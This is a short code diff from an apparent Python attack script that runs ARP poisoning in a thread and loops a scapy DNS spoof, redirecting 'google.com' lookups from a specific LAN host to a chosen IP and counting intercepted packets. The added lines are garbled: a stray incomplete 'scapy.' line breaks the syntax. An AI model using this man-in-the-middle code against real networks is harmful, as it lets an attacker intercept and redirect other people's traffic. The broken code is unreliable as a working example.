@@ -60,7 +60,8 @@ def main() :
     arpThread.start()
     while True: 
         try:
-            scapy.dns_spoof(joker="188.114.96.0", match='google.com', from_ip='192.168.178.144')
+            scapy.
+            scapy.DNS_am(joker="188.114.96.0", match='google.com', from_ip='192.168.178.144')
             pktCounter = pktCounter + 1
             print('Intercepted packets: ' + str(pktCounter) )
         except KeyboardInterrupt:
